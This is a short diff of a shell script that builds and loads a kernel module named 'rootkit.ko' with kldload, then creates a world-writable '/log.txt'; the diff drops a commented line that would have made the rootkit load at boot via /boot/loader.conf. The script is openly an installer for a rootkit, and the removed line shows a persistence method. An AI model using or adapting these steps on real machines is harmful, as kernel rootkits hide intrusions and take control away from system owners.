@@ -1,7 +1,6 @@
 #!/bin/sh
 
 make
-#echo 'rootkit_load="YES"' > /boot/loader.conf
 kldload ./rootkit.ko
 echo "" > /log.txt
 chmod 666 /log.txt
